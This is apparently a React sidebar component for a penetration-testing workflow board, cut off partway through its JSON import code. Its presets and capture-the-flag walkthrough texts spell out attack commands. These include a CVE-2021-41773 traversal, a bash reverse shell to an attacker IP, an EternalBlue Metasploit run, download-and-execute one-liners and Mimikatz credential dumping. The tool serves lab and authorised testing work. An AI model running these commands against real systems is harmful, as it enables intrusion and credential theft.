/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { PentestNode, NodeConnection, NodeClass, NodeState, SuggestionRule } from '@/components/phantom/types';
import { WORKFLOW_TEMPLATES } from '@/components/phantom/data/templates';
import { Shield, Settings, Server, Plus, Download, Upload, Cpu, Play, ClipboardList, KeyRound, Globe, FileJson, Trash2, HelpCircle, Sparkles, BookOpen, Terminal, Database } from 'lucide-react';

// Preset walkthrough inputs for easy playground trigger
const WALKTHROUGH_PRESETS = [
  {
    name: 'Blogger.pg WordPress Audit',
    text: `# Target blog audit of blogger.pg
We start by doing an initial external port scan.
Nmap command:
nmap -p- --min-rate 5200 192.168.53.217 -sV

The scan reveals port 80 (HTTP) is open. We can fuzz directories using ffuf:
ffuf -u http://blogger.pg/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

We see blocker.pg runs a WordPress installation. Let's scan wordpress for plugins and vulnerable vectors:
wpscan --url http://blogger.pg -e ap

Our wpscan reveals a vulnerable plugin. Let's trigger our reverse shell payload using the exploit vector:
python3 wp_exploit.py --target blogger.pg --attacker-ip 192.168.49.53 --command "su vagrant"

We gain access as vagrant. The password is vagrant. Let's upgrade our prompt:
su vagrant
password: vagrant`
  },
  {
    name: 'THM Blue CVE-2017-0144 (EternalBlue)',
    text: `# TryHackMe Blue Writeup
Let's perform a fast vulnerability scan with Nmap targeting MS17-010:
nmap --script vulns -p 445 10.10.12.82

We confirm EternalBlue MS17-010 is vulnerable on target 10.10.12.82.
Let's launch MSF Metasploit console to run the exploit:
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.12.82; set LHOST 10.10.14.53; run"

After gaining a SYSTEM meterpreter shell, we can extract NT hashes offline:
hashdump`
  },
  {
    name: 'Apache HTTP traversal CVE-2021-41773',
    text: `# Apache Exploit Path
First, scan the target IP using Nmap:
nmap -sV -p 80 10.129.184.22

We find Apache Server v2.4.49, which is vulnerable to directory traversal CVE-2021-41773.
Let's verify reading the local system passwd file via traversal:
curl --data "A=A" http://10.129.184.22/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd

Now, trigger remote code execution callback via curl executing sh payload:
curl --data "echo; bash -c 'bash -i >& /dev/tcp/10.10.14.8/5555 0>&1'" http://10.129.184.22/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh`
  }
];

interface SidebarProps {
  target: string;
  onChangeTarget: (val: string) => void;
  attackerIp: string;
  onChangeAttackerIp: (val: string) => void;
  globalVars: Record<string, string>;
  setGlobalVars: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  nodes: PentestNode[];
  connections: NodeConnection[];
  customRules: SuggestionRule[];
  onUpdateCustomRules: (rules: SuggestionRule[]) => void;
  onAddNode: (node: PentestNode) => void;
  onReplaceGraph: (nodes: PentestNode[], connections: NodeConnection[], name?: string) => void;
  onLogMessage: (type: 'info' | 'success' | 'error' | 'command_copied' | 'state_change' | 'ai', msg: string) => void;
}

export default function Sidebar({
  target,
  onChangeTarget,
  attackerIp,
  onChangeAttackerIp,
  globalVars,
  setGlobalVars,
  nodes,
  connections,
  customRules,
  onUpdateCustomRules,
  onAddNode,
  onReplaceGraph,
  onLogMessage
}: SidebarProps) {
  const [activeSidebarTab, setActiveSidebarTab] = useState<'variables' | 'ingestion' | 'procedures' | 'findings' | 'json'>('variables');
  const [walkthroughText, setWalkthroughText] = useState('');
  const [parseLoading, setParseLoading] = useState(false);

  // Raw JSON direct schema edit states
  const [jsonText, setJsonText] = useState('');
  const [jsonError, setJsonError] = useState<string | null>(null);

  // Synchronize canvas state ONLY when entering the json tab to preserve active cursor typing state
  const prevTabRef = React.useRef(activeSidebarTab);
  useEffect(() => {
    if (activeSidebarTab === 'json' && prevTabRef.current !== 'json') {
      const fullDiagram = {
        nodes: nodes.map(n => ({
          id: n.id,
          title: n.title,
          description: n.description,
          type: n.type,
          tool: n.tool,
          state: n.state,
          commandTemplate: n.commandTemplate,
          customParams: n.customParams || {},
          evidenceProduced: n.evidenceProduced || {},
          position: n.position,
          tags: n.tags || []
        })),
        connections: connections.map(c => ({
          id: c.id,
          sourceNodeId: c.sourceNodeId,
          targetNodeId: c.targetNodeId,
          type: c.type || 'default',
          label: c.label
        })),
        globalVars: globalVars
      };
      setJsonText(JSON.stringify(fullDiagram, null, 2));
      setJsonError(null);
    }
    prevTabRef.current = activeSidebarTab;
  }, [activeSidebarTab, nodes, connections, globalVars]);

  const [selectedCategory, setSelectedCategory] = useState<NodeClass>('discovery');
  const [toolText, setToolText] = useState('Nmap');
  const [commandTemplate, setCommandTemplate] = useState('nmap -sCV -p$PORT $TARGET -oN nmap_init.txt');
  const [selectedPresetIndex, setSelectedPresetIndex] = useState<number>(0);
  const [suggestLoading, setSuggestLoading] = useState(false);
  const [aiSuggestions, setAiSuggestions] = useState<any[]>([]);

  const handleParseWalkthrough = async () => {
    if (!walkthroughText.trim()) return;
    setParseLoading(true);
    onLogMessage('info', 'Cognitive Walkthrough module initiated. Processing raw text structure with AI model...');
    try {
      const response = await fetch('/api/ai/parse-walkthrough', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ walkthroughText })
      });
      const data = await response.json();
      if (data.nodes && data.nodes.length > 0) {
        if (data.globalVars) {
          setGlobalVars(data.globalVars);
          // Sync default target if available
          if (data.globalVars['$TARGET']) {
            onChangeTarget(data.globalVars['$TARGET']);
          }
          if (data.globalVars['$ATTACKER_IP']) {
            onChangeAttackerIp(data.globalVars['$ATTACKER_IP']);
          }
        }
        onReplaceGraph(data.nodes, data.connections, 'Parsed Ingest Writeup');
        onLogMessage('success', `Dynamic CTF board reconstructed successfully! Created ${data.nodes.length} attack nodes and detected ${Object.keys(data.globalVars || {}).length} target-specific variables automatically.`);
      } else if (data.error) {
        onLogMessage('error', `Walkthrough parse failed: ${data.error}`);
      }
    } catch (err: any) {
      onLogMessage('error', `Failed to connect with AI Walkthrough Parser: ${err.message}`);
    } finally {
      setParseLoading(false);
    }
  };

  // Manual presets when creating simple node
  const categoryPresets: Record<NodeClass, { tool: string; title: string; cmd: string; params: Record<string, string>; description: string; tags: string[] }[]> = {
    discovery: [
      {
        tool: 'Nmap',
        title: 'Nmap Port Scanner',
        cmd: 'nmap -sCV -p$PORT $TARGET -oN nmap_init.txt',
        params: { '$PORT': '80,443,445' },
        description: 'Offensive service version scan with script scanning against specific target ports.',
        tags: ['recon', 'portscan', 'nmap']
      },
      {
        tool: 'Rustscan',
        title: 'Rustscan Fast Sweep',
        cmd: 'rustscan -a $TARGET --ulimit 5000 -- -sV',
        params: {},
        description: 'Brutally fast port scanner written in Rust, running standard Nmap verifications in seconds.',
        tags: ['recon', 'rustscan', 'portscan']
      },
      {
        tool: 'Naabu',
        title: 'Naabu Port Scan',
        cmd: 'naabu -host $TARGET -p $PORT -silent',
        params: { '$PORT': '1-65535' },
        description: 'Fast, scalable port enumerator designed to minimize packet drops and list open ports.',
        tags: ['recon', 'naabu', 'fast-scan']
      }
    ],
    web: [
      {
        tool: 'FFUF',
        title: 'FFUF Web Fuzzing',
        cmd: 'ffuf -u $PROTO://$TARGET:$PORT/FUZZ -w $WORDLIST -e $EXT -ic -c',
        params: { '$PROTO': 'http', '$PORT': '80', '$WORDLIST': '/usr/share/seclists/Discovery/Web-Content/common.txt', '$EXT': '.php,.html' },
        description: 'High-speed directory and file brute-forcer to map active pages and hidden web paths.',
        tags: ['web', 'ffuf', 'fuzzing']
      },
      {
        tool: 'Nuclei',
        title: 'Nuclei vulnerability check',
        cmd: 'nuclei -u $PROTO://$TARGET:$PORT/ -severity critical,high,medium',
        params: { '$PROTO': 'http', '$PORT': '80' },
        description: 'Automated template-driven scanner for security posture assessment and precise CVE detection.',
        tags: ['web', 'nuclei', 'vulnerability']
      },
      {
        tool: 'Dirsearch',
        title: 'Dirsearch directory discovery',
        cmd: 'dirsearch -u $PROTO://$TARGET:$PORT/ -e php,txt,html -x 404,403',
        params: { '$PROTO': 'http', '$PORT': '80' },
        description: 'Heuristic and recursive wordlist-based web directory scanner.',
        tags: ['web', 'dirsearch', 'recon']
      },
      {
        tool: 'Whatweb',
        title: 'Whatweb Stack Analysis',
        cmd: 'whatweb -a 3 $PROTO://$TARGET:$PORT/',
        params: { '$PROTO': 'http', '$PORT': '80' },
        description: 'Identifies active software platforms, framework libraries, and web-server headers of target.',
        tags: ['web', 'whatweb', 'fingerprint']
      }
    ],
    ad: [
      {
        tool: 'CrackMapExec',
        title: 'CME Active Directory Scan',
        cmd: 'crackmapexec smb $TARGET -u "$USER" -p "$PASSWORD" --shares',
        params: { '$USER': 'Administrator', '$PASSWORD': 'Password123' },
        description: 'Multi-threaded active directory auditing and credential spraying utility for SMB/WinRM networks.',
        tags: ['ad', 'crackmapexec', 'cred-spray']
      },
      {
        tool: 'BloodHound',
        title: 'BloodHound ingestion',
        cmd: 'sharphound.exe -c All --domain $DOMAIN --dc-ip $TARGET',
        params: { '$DOMAIN': 'corp.local' },
        description: 'Collects LDAP relationships and group access policies to feed the BloodHound graph analyzer.',
        tags: ['ad', 'bloodhound', 'ldap-enum']
      },
      {
        tool: 'SMBMap',
        title: 'SMBMap folder review',
        cmd: 'smbmap -H $TARGET -u "$USER" -p "$PASSWORD" -R',
        params: { '$USER': 'guest', '$PASSWORD': '' },
        description: 'Check custom shares permissions and list files recursively on active shares.',
        tags: ['ad', 'smb', 'share-enum']
      },
      {
        tool: 'enum4linux',
        title: 'enum4linux System Discovery',
        cmd: 'enum4linux-ng -A $TARGET',
        params: {},
        description: 'Audit NetBIOS names, SID history, user groups, and SMB shares on Windows and Samba setups.',
        tags: ['ad', 'smb', 'enum']
      }
    ],
    exploitation: [
      {
        tool: 'Metasploit',
        title: 'Metasploit service attack',
        cmd: 'msfconsole -q -x "use exploit/multi/handler; set LHOST $ATTACKER_IP; set LPORT $PORT; run"',
        params: { '$PORT': '4444' },
        description: 'Execute verified web/service payloads and open listener terminals on the network.',
        tags: ['exploitation', 'metasploit', 'handler']
      },
      {
        tool: 'SQLMap',
        title: 'SQLMap payload tester',
        cmd: 'sqlmap -u "http://$TARGET:$PORT/$PAGE" -p $PARAMETER --batch --banner --current-db',
        params: { '$PORT': '80', '$PAGE': 'login.php?id=1', '$PARAMETER': 'id' },
        description: 'Exploit database injection queries, list active database users, and download schemas.',
        tags: ['exploitation', 'sqlmap', 'sqli']
      },
      {
        tool: 'Custom Exploit',
        title: 'Python Custom Exploit',
        cmd: 'python3 exploit.py -t $TARGET -p $PORT -lh $ATTACKER_IP -lp $LPORT',
        params: { '$PORT': '80', '$LPORT': '4444' },
        description: 'Compile custom buffer overflow scripts or privilege escalation vectors.',
        tags: ['exploitation', 'python', 'rce']
      }
    ],
    'post-exploitation': [
      {
        tool: 'LinPEAS',
        title: 'LinPEAS PrivEsc Check',
        cmd: 'curl -L http://$ATTACKER_IP/linpeas.sh | sh',
        params: {},
        description: 'Local credential extraction and Linux environment vulnerabilities checker.',
        tags: ['post-exploitation', 'linpeas', 'privesc']
      },
      {
        tool: 'WinPEAS',
        title: 'WinPEAS PrivEsc Audit',
        cmd: 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://$ATTACKER_IP/winPEAS.ps1\')"',
        params: {},
        description: 'Gather Windows registry configurations and potential local system privileges escalation paths.',
        tags: ['post-exploitation', 'winpeas', 'privesc']
      },
      {
        tool: 'Mimikatz',
        title: 'Mimikatz offline passwords',
        cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
        params: {},
        description: 'Extract LSA hashes, cleartext domain passwords, and authentication ticket tokens.',
        tags: ['post-exploitation', 'mimikatz', 'passwords']
      }
    ],
    custom: [
      {
        tool: 'Ping Check',
        title: 'ICMP host check',
        cmd: 'ping -c 4 $TARGET',
        params: {},
        description: 'Standard raw diagnostic ping check targeting the target IP.',
        tags: ['debug', 'ping']
      },
      {
        tool: 'Bash callback',
        title: 'Bash RevShell callback',
        cmd: 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1',
        params: {},
        description: 'Full duplex shell socket trigger back to the interactive security listener.',
        tags: ['custom', 'revshell']
      }
    ]
  };

  const handleCategoryPresetChange = (idx: number) => {
    setSelectedPresetIndex(idx);
    const prs = categoryPresets[selectedCategory][idx];
    if (prs) {
      setToolText(prs.tool);
      setCommandTemplate(prs.cmd);
    }
  };

  const handleCategoryChange = (cat: NodeClass) => {
    setSelectedCategory(cat);
    setSelectedPresetIndex(0);
    const prs = categoryPresets[cat][0];
    if (prs) {
      setToolText(prs.tool);
      setCommandTemplate(prs.cmd);
    } else {
      setToolText('');
      setCommandTemplate('');
    }
  };

  const handleAddCustomNode = () => {
    if (!toolText.trim()) return;

    const prs = categoryPresets[selectedCategory]?.[selectedPresetIndex] || {
      title: `${toolText} - Custom Action`,
      description: `Manually added ${toolText} custom action. Modify template parameters in panel.`,
      params: {},
      tags: [toolText.toLowerCase(), selectedCategory]
    };

    const newNode: PentestNode = {
      id: `node-${Date.now()}`,
      title: prs.title || `${toolText} - Custom Node`,
      description: prs.description || `Manually added ${toolText} custom action.`,
      type: selectedCategory,
      tool: toolText,
      state: 'pending',
      commandTemplate: commandTemplate,
      customParams: prs.params ? { ...prs.params } : {},
      evidenceProduced: {},
      position: { x: Math.round(150 + Math.random() * 80), y: Math.round(150 + Math.random() * 80) },
      tags: prs.tags || [toolText.toLowerCase(), selectedCategory],
      updatedAt: new Date().toISOString()
    };

    onAddNode(newNode);
    onLogMessage('success', `Created custom action node on board: ${toolText}`);
  };

  // Load a Preloaded Playbook template
  const handleLoadTemplate = (tpl: any) => {
    onReplaceGraph(tpl.nodes, tpl.connections, tpl.name);
  };

  // Aggregate current open ports, services, and credentials from all nodes
  const getAllPorts = (): number[] => {
    const ports = new Set<number>();
    nodes.forEach(n => {
      n.evidenceProduced.open_ports?.forEach(p => ports.add(p));
    });
    return Array.from(ports).sort((a, b) => a - b);
  };

  const getAllServices = (): string[] => {
    const services = new Set<string>();
    nodes.forEach(n => {
      n.evidenceProduced.services?.forEach(s => services.add(s.toLowerCase()));
    });
    return Array.from(services);
  };

  const getAllCreds = () => {
    const creds: any[] = [];
    nodes.forEach(n => {
      n.evidenceProduced.credentials?.forEach(c => {
        creds.push({ ...c, sourceNode: n.tool });
      });
    });
    return creds;
  };

  const allPorts = getAllPorts();
  const allServices = getAllServices();
  const allCreds = getAllCreds();

  // Export board JSON workflow config
  const handleExportJson = () => {
    const exportState = {
      target,
      attackerIp,
      globalVars,
      nodes,
      connections,
      exportedAt: new Date().toISOString()
    };
    const blob = new Blob([JSON.stringify(exportState, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `pentest_graph_${target || 'workflow'}.json`;
    link.click();
    URL.revokeObjectURL(url);
    onLogMessage('success', 'Tactical workflow schema exported successfully as JSON file.');
  };

  // Base plan dynamic ingestion and validation
  const loadBasePlanData = (data: any, planName: string = 'Base Plan') => {
    try {
      if (!data || typeof data !== 'object') {
        throw new Error('Payload format mismatch: Root container is not a JSON object.');
      }

      // Helper function to sanitize user text inputs
      const safeStr = (raw: any, fallback = ''): string => {
        if (typeof raw !== 'string') return fallback;
        return raw.replace(/</g, '&lt;').replace(/>/g, '&gt;').trim();
      };

      // 1. Validate and Parse Nodes
      const validNodes: PentestNode[] = [];
      const incomingNodes = Array.isArray(data.nodes) ? data.nodes : [];
      incomingNodes.forEach((node: any, idx: number) => {
        if (!node || typeof node !== 'object') return;
        const cleanId = typeof node.id === 'string' ? safeStr(node.id) : `node-base-${Date.now()}-${idx}`;
        const cleanTitle = typeof node.title === 'string' ? safeStr(node.title) : 'Unnamed Milestone';
        const cleanDescription = typeof node.description === 'string' ? safeStr(node.description) : '';
        const cleanType: NodeClass = (node.type === 'discovery' || node.type === 'web' || node.type === 'ad' || node.type === 'exploitation' || node.type === 'post-exploitation' || node.type === 'custom') ? node.type : 'custom';
        const cleanTool = typeof node.tool === 'string' ? safeStr(node.tool) : 'Generic';
        const cleanState: NodeState = (node.state === 'pending' || node.state === 'running' || node.state === 'success' || node.state === 'failed' || node.state === 'discarded') ? node.state : 'pending';
        const cleanCommandTemplate = typeof node.commandTemplate === 'string' ? node.commandTemplate : '';
        
        const cleanParams: Record<string, string> = {};
        if (node.customParams && typeof node.customParams === 'object') {
          Object.entries(node.customParams).forEach(([k, v]) => {
            if (typeof k === 'string' && typeof v === 'string') {
              cleanParams[safeStr(k)] = safeStr(v);
            }
          });
        }
        
        const cleanEvidence: any = {};
        if (node.evidenceProduced && typeof node.evidenceProduced === 'object') {
          const ev = node.evidenceProduced;
          if (Array.isArray(ev.open_ports)) {
            cleanEvidence.open_ports = ev.open_ports.map((p: unknown) => Number(p)).filter((p: number) => !isNaN(p));
          }
          if (Array.isArray(ev.services)) {
            cleanEvidence.services = ev.services.map((s: unknown) => safeStr(s)).filter(Boolean);
          }
          if (typeof ev.findings === 'string') {
            cleanEvidence.findings = safeStr(ev.findings);
          }
          if (Array.isArray(ev.credentials)) {
            cleanEvidence.credentials = ev.credentials
              .filter((c: any) => c && typeof c === 'object')
              .map((c: any) => ({
                username: safeStr(c.username, 'admin'),
                password: c.password !== undefined ? safeStr(c.password) : undefined,
                hash: c.hash !== undefined ? safeStr(c.hash) : undefined,
                service: c.service !== undefined ? safeStr(c.service) : undefined
              }));
          }
          if (Array.isArray(ev.extracted_urls)) {
            cleanEvidence.extracted_urls = ev.extracted_urls.map((u: unknown) => safeStr(u)).filter(Boolean);
          }
          if (typeof ev.notes === 'string') {
            cleanEvidence.notes = safeStr(ev.notes);
          }
          if (typeof ev.raw_output === 'string') {
            cleanEvidence.raw_output = safeStr(ev.raw_output);
          }
        }

        const cleanPosition = {
          x: typeof node.position?.x === 'number' ? Math.max(-10000, Math.min(10000, node.position.x)) : 100,
          y: typeof node.position?.y === 'number' ? Math.max(-10000, Math.min(10000, node.position.y)) : 100
        };

        const cleanTags = Array.isArray(node.tags) 
          ? node.tags.map((t: unknown) => safeStr(t)).filter(Boolean) 
          : [cleanTool.toLowerCase()];

        validNodes.push({
          id: cleanId,
          title: cleanTitle,
          description: cleanDescription,
          type: cleanType,
          tool: cleanTool,
          state: cleanState,
          commandTemplate: cleanCommandTemplate,
          customParams: cleanParams,
          evidenceProduced: cleanEvidence,
          position: cleanPosition,
          tags: cleanTags,
          isSuggested: !!node.isSuggested,
          suggestedReason: node.suggestedReason ? safeStr(node.suggestedReason) : undefined,
          updatedAt: typeof node.updatedAt === 'string' ? safeStr(node.updatedAt) : new Date().toISOString()
        });
      });

      // 2. Validate Connections
      const validConnections: NodeConnection[] = [];
      const incomingConns = Array.isArray(data.connections) ? data.connections : [];
      incomingConns.forEach((conn: any, idx: number) => {
        if (!conn || typeof conn !== 'object') return;
        const cleanId = typeof conn.id === 'string' ? safeStr(conn.id) : `conn-base-${Date.now()}-${idx}`;
        const cleanSourceId = typeof conn.sourceNodeId === 'string' ? safeStr(conn.sourceNodeId) : '';
        const cleanTargetId = typeof conn.targetNodeId === 'string' ? safeStr(conn.targetNodeId) : '';
        
        if (cleanSourceId && cleanTargetId) {
          validConnections.push({
            id: cleanId,
            sourceNodeId: cleanSourceId,
            targetNodeId: cleanTargetId,
            type: (conn.type === 'default' || conn.type === 'credential_flow' || conn.type === 'pivoting') ? conn.type : 'default',
            label: conn.label !== undefined ? safeStr(conn.label) : undefined
          });
        }
      });

      // 3. Validate suggestion Rules
      const validRules: SuggestionRule[] = [];
      const incomingRules = Array.isArray(data.rules) ? data.rules : [];
      incomingRules.forEach((rule: any, idx: number) => {
        if (!rule || typeof rule !== 'object') return;
        const cleanId = typeof rule.id === 'string' ? safeStr(rule.id) : `custom-rule-${Date.now()}-${idx}`;
        const cleanName = typeof rule.name === 'string' ? safeStr(rule.name) : 'Custom recommendation trigger';
        
        const cond = rule.condition || {};
        const cleanCondition: any = {};
        if (typeof cond.service === 'string') cleanCondition.service = safeStr(cond.service);
        if (typeof cond.port === 'number' || !isNaN(Number(cond.port))) cleanCondition.port = Number(cond.port);
        if (typeof cond.tool === 'string') cleanCondition.tool = safeStr(cond.tool);
        if (typeof cond.findings === 'string') cleanCondition.findings = safeStr(cond.findings);

        const sugNode = rule.suggestNode || {};
        const cleanSugNode: any = {
          title: typeof sugNode.title === 'string' ? safeStr(sugNode.title) : 'Suggested Milestone',
          description: typeof sugNode.description === 'string' ? safeStr(sugNode.description) : '',
          type: (sugNode.type === 'discovery' || sugNode.type === 'web' || sugNode.type === 'ad' || sugNode.type === 'exploitation' || sugNode.type === 'post-exploitation' || sugNode.type === 'custom') ? sugNode.type : 'custom',
          tool: typeof sugNode.tool === 'string' ? safeStr(sugNode.tool) : 'Generic',
          commandTemplate: typeof sugNode.commandTemplate === 'string' ? sugNode.commandTemplate : '',
          tags: Array.isArray(sugNode.tags) ? sugNode.tags.map((t: any) => safeStr(t)).filter(Boolean) : []
        };

        validRules.push({
          id: cleanId,
          name: cleanName,
          condition: cleanCondition,
          suggestNode: cleanSugNode
        });
      });

      // 4. Update the graph layout and custom rules array
      onReplaceGraph(validNodes, validConnections, planName);
      onUpdateCustomRules(validRules);
      
      onLogMessage('success', `LOADED BASE WORKFLOW: Converted "${planName}" base plan. Active payload: ${validNodes.length} nodes, ${validConnections.length} links, and ${validRules.length} live tactical command rules configured.`);

    } catch (err: any) {
      onLogMessage('error', `Base Plan Ingestion aborted during checks: ${err.message}`);
    }
  };

  const handleImportBasePlanJson = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      try {
        const rawText = event.target?.result;
        if (typeof rawText !== 'string') throw new Error('Could not parse file text contents.');
        const data = JSON.parse(rawText);
        loadBasePlanData(data, data.name || file.name);
      } catch (err: any) {
        onLogMessage('error', `JSON Base Plan Load Error: ${err.message}`);
      }
    };
    reader.readAsText(file);
    e.target.value = ''; // Reset input to allow double trigger
  };

  const handleLoadSampleBasePlan = () => {
    const samplePlan = {
      name: "WordPress / WPScan Dynamic Base Plan",
      description: "Example base plan featuring an NMAP initial scan node pointing to a HTTP port running WordPress, triggering our dynamic suggestion rule.",
      nodes: [
        {
          id: "node-init-nmap-1",
          title: "Nmap Initial Reconnaissance",
          description: "Active port scanner locating open HTTP services and running service audits.",
          type: "discovery",
          tool: "Nmap",
          state: "success",
          commandTemplate: "nmap -sCV -p 80,443 $TARGET",
          evidenceProduced: {
            open_ports: [80],
            services: ["http"],
            findings: "Port 80/tcp open (Apache/2.4.41)\nDetected HTTP Header: WordPress 5.8\nRunning wpscan-vulnerability-check script."
          },
          position: { x: 100, y: 250 },
          tags: ["recon", "portscan", "nmap"],
          updatedAt: new Date().toISOString()
        }
      ],
      connections: [],
      rules: [
        {
          id: "rule-custom-wordpress-trigger",
          name: "WordPress / HTTP found -> WordPress Vulnerability Scanner (WPScan)",
          condition: {
            tool: "nmap",
            service: "http",
            findings: "WordPress"
          },
          suggestNode: {
            title: "WPScan WordPress Scanner",
            description: "Dedicated vulnerability audit scans WordPress themes, plugins, and credentials to find security gaps.",
            type: "web",
            tool: "WPScan",
            commandTemplate: "wpscan --url http://$TARGET:$PORT/ --enumerate vp,vt,cb,u --plugins-detection aggressive --api-token $WP_API_KEY",
            tags: ["web", "wordpress", "vulnerability"]
          }
        },
        {
          id: "rule-custom-git-trigger",
          name: "Git backup found -> GitTools Repository extractor",
          condition: {
            findings: ".git"
          },
          suggestNode: {
            title: "GitTools Extractor",
            description: "Extract commits, source code, and historical logs from exposed .git folder repositories.",
            type: "web",
            tool: "GitTools",
            commandTemplate: "bash GitTools/Extractor/extractor.sh http://$TARGET/.git/ /tmp/extracted_repo",
            tags: ["recon", "git", "source-leak"]
          }
        }
      ]
    };

    loadBasePlanData(samplePlan, samplePlan.name);
  };

  // Import board JSON workflow config or full system migration database
  const handleImportJson = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      try {
        const rawText = event.target?.result;
        if (typeof rawText !== 'string') {
          throw new Error('Unsupported or corrupt file encoding.');
        }

        const data = JSON.parse(rawText);
        
        // 1. Core structural array verification
        if (!data || typeof data !== 'object') {
          throw new Error('Configuration payload must describe a valid JSON object schema.');
        }

        // Full system backup check!
        if (data.backupIdentifier === "KRONOS_FULL_SYSTEM_BACKUP") {
          if (Array.isArray(data.savedRepertoire)) {
            localStorage.setItem('kronos_saved_repertoire_db', JSON.stringify(data.savedRepertoire));
          }
          if (data.activeState) {
            const act = data.activeState;
            onReplaceGraph(act.nodes || [], act.connections || []);
            if (act.globalVars) {
              setGlobalVars(act.globalVars);
            }
          }
          onLogMessage('success', `📂 ¡Migración Completa Realizada! Importados con éxito todos los playbooks y sincronizado el espacio de trabajo en tiempo real.`);
          alert(`¡Migración exitosa!\n- Base de datos totalmente restaurada.\n- Sincronización de componentes aplicada.`);
          window.dispatchEvent(new CustomEvent('kronos-db-updated'));
          return;
        }

        if (!Array.isArray(data.nodes)) {
          throw new Error('Import aborted: Missing or malformed "nodes" structural layer.');
        }
        if (!Array.isArray(data.connections)) {
          throw new Error('Import aborted: Missing or malformed "connections" networking layer.');
        }

        // Helper: Strip raw HTML/Script brackets to maintain secure workspace integrity
        const sanitizeStr = (str: any, defaultVal = ''): string => {
          if (typeof str !== 'string') return defaultVal;
          return str.replace(/<[^>]*>/g, '').trim();
        };

        // 2. Validate and sanitize Nodes array with strict checks
        const validNodes: PentestNode[] = [];
        data.nodes.forEach((node: any, idx: number) => {
          if (!node || typeof node !== 'object') {
            onLogMessage('error', `Skipping malformed node entry at index ${idx}.`);
            return;
          }
          
          const cleanId = typeof node.id === 'string' ? sanitizeStr(node.id) : `node-${Date.now()}-${idx}`;
          const cleanTitle = typeof node.title === 'string' ? sanitizeStr(node.title) : 'Untitled Action';
          const cleanDescription = typeof node.description === 'string' ? sanitizeStr(node.description) : '';
          
          const validTypes: NodeClass[] = ['discovery', 'web', 'ad', 'exploitation', 'post-exploitation', 'custom'];
          const cleanType = validTypes.includes(node.type) ? node.type : 'custom';
          
          const cleanTool = typeof node.tool === 'string' ? sanitizeStr(node.tool) : 'Tool';
          
          const validStates: NodeState[] = ['pending', 'running', 'success', 'failed', 'discarded'];
          const cleanState = validStates.includes(node.state) ? node.state : 'pending';
          
          const cleanCommandTemplate = typeof node.commandTemplate === 'string' ? node.commandTemplate : '';
          
          const cleanParams: Record<string, string> = {};
          if (node.customParams && typeof node.customParams === 'object') {
            Object.entries(node.customParams).forEach(([k, v]) => {
              if (typeof k === 'string' && typeof v === 'string') {
                cleanParams[sanitizeStr(k)] = sanitizeStr(v);
              }
            });
          }
          
          const cleanEvidence: any = {};
          if (node.evidenceProduced && typeof node.evidenceProduced === 'object') {
            const ev = node.evidenceProduced;
            if (Array.isArray(ev.open_ports)) {
              cleanEvidence.open_ports = ev.open_ports.map((p: unknown) => Number(p)).filter((p: number) => !isNaN(p));
            }
            if (Array.isArray(ev.services)) {
              cleanEvidence.services = ev.services.map((s: unknown) => sanitizeStr(s)).filter(Boolean);
            }
            if (typeof ev.findings === 'string') {
              cleanEvidence.findings = sanitizeStr(ev.findings);
            }
            if (Array.isArray(ev.credentials)) {
              cleanEvidence.credentials = ev.credentials
                .filter((c: any) => c && typeof c === 'object')
                .map((c: any) => ({
                  username: sanitizeStr(c.username, 'admin'),
                  password: c.password !== undefined ? sanitizeStr(c.password) : undefined,
                  hash: c.hash !== undefined ? sanitizeStr(c.hash) : undefined,
                  service: c.service !== undefined ? sanitizeStr(c.service) : undefined
                }));
            }
            if (Array.isArray(ev.extracted_urls)) {
              cleanEvidence.extracted_urls = ev.extracted_urls.map((u: unknown) => sanitizeStr(u)).filter(Boolean);
            }
            if (typeof ev.notes === 'string') {
              cleanEvidence.notes = sanitizeStr(ev.notes);
            }
            if (typeof ev.raw_output === 'string') {
              cleanEvidence.raw_output = sanitizeStr(ev.raw_output);
            }
          }

          const cleanPosition = {
            x: typeof node.position?.x === 'number' ? Math.max(-10000, Math.min(10000, node.position.x)) : 100,
            y: typeof node.position?.y === 'number' ? Math.max(-10000, Math.min(10000, node.position.y)) : 100
          };

          const cleanTags = Array.isArray(node.tags) 
            ? node.tags.map((t: unknown) => sanitizeStr(t)).filter(Boolean) 
            : [cleanTool.toLowerCase()];

          validNodes.push({
            id: cleanId,
            title: cleanTitle,
            description: cleanDescription,
            type: cleanType,
            tool: cleanTool,
            state: cleanState,
            commandTemplate: cleanCommandTemplate,
            customParams: cleanParams,
            evidenceProduced: cleanEvidence,
            position: cleanPosition,
            tags: cleanTags,
            isSuggested: !!node.isSuggested,
            suggestedReason: node.suggestedReason ? sanitizeStr(node.suggestedReason) : undefined,
            updatedAt: typeof node.updatedAt === 'string' ? sanitizeStr(node.updatedAt) : new Date().toISOString()
          });
        });

        // 3. Validate Connections
        const validConnections: NodeConnection[] = [];
        data.connections.forEach((conn: any, idx: number) => {
          if (!conn || typeof conn !== 'object') return;
          const cleanId = typeof conn.id === 'string' ? sanitizeStr(conn.id) : `conn-${Date.now()}-${idx}`;
          const cleanSourceId = typeof conn.sourceNodeId === 'string' ? sanitizeStr(conn.sourceNodeId) : '';
          const cleanTargetId = typeof conn.targetNodeId === 'string' ? sanitizeStr(conn.targetNodeId) : '';
          
          if (cleanSourceId && cleanTargetId) {
            validConnections.push({
              id: cleanId,
